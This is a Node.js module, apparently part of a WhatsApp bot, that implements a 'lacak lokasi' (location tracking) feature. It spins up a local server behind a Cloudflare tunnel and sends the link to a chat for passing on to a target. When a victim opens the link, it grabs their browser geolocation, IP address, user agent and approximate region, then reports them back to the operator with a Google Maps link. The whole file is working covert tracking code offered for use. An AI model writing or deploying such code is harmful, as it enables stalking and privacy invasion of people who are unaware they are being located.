const http = require("http");
const { spawn } = require("child_process");
const { getIPInfo } = require("./cekhost");

async function startLacakLokasi(chatId, sock, sendMessage, LOGO_URL) {
  const port = 3000 + Math.floor(Math.random() * 5000);
  const server = http.createServer(async (req, res) => {
    if (req.url.startsWith("/location")) {
      const params = new URL(req.url, `http://localhost:${port}`).searchParams;
      const lat = params.get("lat");
      const lon = params.get("lon");
      const userAgent = req.headers["user-agent"] || "Unknown";
      const ipTarget = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "Unknown";
      const waktuKlik = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
      let connectionType = "Unknown";
      if (req.headers["sec-ch-ua-mobile"]) connectionType = req.headers["sec-ch-ua-mobile"] === "?1" ? "Mobile" : "Desktop";
      let negara = "Tidak diketahui";
      let provinsi = "Tidak diketahui";
      let kodePos = "Tidak tersedia";
      try {
        const geo = await getIPInfo(ipTarget);
        if (geo) {
          if (geo.country) negara = geo.country;
          if (geo.regionName) provinsi = geo.regionName;
          if (geo.zip) kodePos = geo.zip;
        }
      } catch (e) {}
      const caption = `┌────[『 𝐃𝐚𝐭𝐚 𝐋𝐨𝐤𝐚𝐬𝐢 』\n│⎋. 𝐋𝐢𝐧𝐤: https://www.google.com/maps?q=${lat},${lon}\n│⎋. 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥\n│⎋. 𝐃𝐚𝐭𝐚: 𝐋𝐨𝐤𝐚𝐬𝐢\n│⎋. 𝐀𝐤𝐮𝐫𝐚𝐬𝐢: 99%\n│⎋. 𝐈𝐏 𝐓𝐚𝐫𝐠𝐞𝐭: ${ipTarget}\n│⎋. 𝐂𝐨𝐝𝐞 𝐏𝐨𝐬: ${kodePos}\n│⎋. 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧: ${connectionType}\n│⎋. 𝐓𝐢𝐦𝐞 𝐂𝐥𝐢𝐜𝐤: ${waktuKlik}\n│⎋. 𝐔𝐬𝐞𝐫𝐀𝐠𝐞𝐧𝐭: ${userAgent}\n│⎋. 𝐍𝐞𝐠𝐚𝐫𝐚: ${negara}\n│⎋. 𝐏𝐫𝐨𝐯𝐢𝐧𝐬𝐢: ${provinsi}\n└───────────────────>`;
      await sock.sendMessage(chatId, {
        image: { url: LOGO_URL },
        caption: caption,
        contextInfo: { forwardingScore: 9999, isForwarded: true }
      });
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end("<h1>Done!</h1>");
      server.close();
    } else {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(`<html><body><script>if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(pos){window.location.href="/location?lat="+pos.coords.latitude+"&lon="+pos.coords.longitude;},function(){alert("Aktifkan lokasi terlebih dahulu.");});}else{alert("Geolokasi tidak didukung.");}</script></body></html>`);
    }
  });
  server.listen(port, async () => {
    try {
      const tunnel = spawn("cloudflared", ["tunnel", "--url", `http://localhost:${port}`]);
      tunnel.stderr.on("data", (data) => {
        const msg = data.toString();
        const match = msg.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/);
        if (match) {
          sock.sendMessage(chatId, {
            image: { url: LOGO_URL },
            caption: `┌────[『 𝐋𝐚𝐜𝐚𝐤 𝐋𝐨𝐤𝐚𝐬𝐢 』\n│⎋. 𝐋𝐢𝐧𝐤: ${match[0]}\n│⎋. 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐌𝐞𝐧𝐮𝐧𝐠𝐠𝐮\n│⎋. 𝐒𝐞𝐫𝐯𝐞𝐫: Cloudflare\n│⎋. 𝐃𝐞𝐩𝐥𝐨𝐲: 𝐓𝐮𝐧𝐧𝐞𝐥\n│⎋. 𝐃𝐚𝐭𝐚: 𝐋𝐨𝐤𝐚𝐬𝐢\n│⎋. 𝐀𝐤𝐮𝐫𝐚𝐬𝐢: 99%\n│⎋. 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: 𝐈𝐧𝐝𝐨𝐧𝐞𝐬𝐢𝐚\n└───────────────────>`,
            contextInfo: { forwardingScore: 9999, isForwarded: true }
          });
        }
      });
    } catch (e) {
      await sendMessage(chatId, "𝐏𝐥𝐞𝐚𝐬𝐞 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 𝐓𝐮𝐧𝐧𝐞𝐥!");
      server.close();
    }
  });
}

module.exports = { startLacakLokasi };